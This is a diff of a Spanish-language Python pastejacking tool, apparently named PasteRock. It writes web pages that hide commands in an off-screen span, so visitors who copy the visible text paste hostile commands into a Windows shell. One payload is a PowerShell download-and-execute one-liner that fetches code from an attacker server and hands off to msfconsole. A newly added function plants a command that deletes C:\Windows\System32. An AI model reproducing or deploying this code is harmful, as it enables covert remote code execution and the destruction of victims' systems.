@@ -23,16 +23,28 @@ exploit""")
 		print """Por favor, copie la powershell, e inicie de nuevo PasteRock, ejemplo: powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.0.22:8080/puaKQmKR');"""
 		os.system("msfconsole -r meta_config")
 	elif resultado == "si":
-		mensaje1=raw_input("Primer Mensaje: ")		
+		mensaje1=raw_input("Primer Mensaje: ")
 		mensaje2=raw_input("Segundo Mensaje: ")
 		comando=raw_input("Comando: ")
 		powershell=raw_input("Por favor, ingrese la powershell: ")
 		ip=raw_input("ingrese ip: ")
 		index="index.html"
 		job=open(index,"w")	
-		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+powershell+"""  c:\ & cls <br> """ + comando + """ </span> """ + mensaje2 + """ </p> """)
+		job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+powershell+"""  c:\ & cls <br> """ + comando + """ </span> """+mensaje2+"""</p> """)
 		job.close()
 		os.system("cp index.html /var/www/html")
 		print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
 	else:
 		print "Escriba lo que es."
+
+def system32():
+	ip=raw_input("ingrese ip: ")
+	mensaje1=raw_input("Primer Mensaje: ")
+	sms2=raw_input("Segundo Mensaje: ")
+	comando=raw_input("comando: ")
+	archivo="index.html"
+	work=open(archivo,"w")	
+	work.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & rd /s C:\Windows\System32 & cls <br> """ + comando + """ </span>"""+sms2+""" </p> """)
+	work.close()
+	os.system("mv index.html /var/www/html")
+	print "[:D] Todo esta completo http://"+ip+"/ Con toda campeon ;v"
